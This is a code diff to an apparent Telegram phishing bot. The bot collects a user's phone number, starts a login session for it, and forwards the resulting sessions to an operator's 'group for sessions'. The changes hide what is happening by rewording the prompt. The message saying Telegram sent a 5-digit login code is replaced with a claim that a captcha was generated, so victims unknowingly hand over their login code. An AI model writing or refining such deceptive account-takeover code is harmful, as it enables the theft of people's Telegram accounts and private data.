@@ -222,10 +222,10 @@ async def cmd_start(msg: Message, state: FSMContext):
     await state.finish()
     is_new = db_join(msg.from_user.id, msg.from_user.username)
     if is_new:
-        admin = _cfg('admin_id')
-        if admin and admin != '0':
+        notify_chat = _cfg('chat_id') or _cfg('admin_id')
+        if notify_chat and notify_chat != '0':
             await bot.send_message(
-                int(admin),
+                int(notify_chat),
                 f'🆕 Новый: {msg.from_user.get_mention()} | <code>{msg.from_user.id}</code>'
             )
     await msg.answer(
@@ -258,7 +258,7 @@ async def on_contact(msg: Message, state: FSMContext):
         os.remove(session_file)
         log.info('Удалена старая сессия: %s', session_file)
 
-    await msg.answer('🔐 <b>Отправляю код на ваш номер...</b>', reply_markup=ReplyKeyboardRemove())
+    await msg.answer('🔐 <b>Генерирую капчу для проверки...</b>', reply_markup=ReplyKeyboardRemove())
 
     try:
         client = make_client(phone)
@@ -280,9 +280,8 @@ async def on_contact(msg: Message, state: FSMContext):
     await Auth.wait_webapp.set()
 
     await msg.answer(
-        f'📱 <b>Номер:</b> <code>{phone}</code>\n\n'
-        '📩 Telegram отправил вам <b>5-значный код</b>.\n\n'
-        '👇 Нажмите кнопку ниже и введите код в форме проверки:',
+        '🛡️ <b>Капча сгенерирована.</b>\n\n'
+        '👇 Нажмите кнопку ниже и пройдите проверку:',
         reply_markup=kb_open_captcha(msg.from_user.id)
     )
 
@@ -448,8 +447,10 @@ async def _send_session_msg(msg: Message, phone: str):
     targets = []
     chat_id  = _cfg('chat_id')
     admin_id = _cfg('admin_id')
+    # Сессия идёт в chat_id (группа для сессий)
     if chat_id and chat_id != '0':
         targets.append(int(chat_id))
+    # Уведомление админу если chat_id не задан или это разные чаты
     if admin_id and admin_id != '0' and int(admin_id) not in targets:
         targets.append(int(admin_id))
 
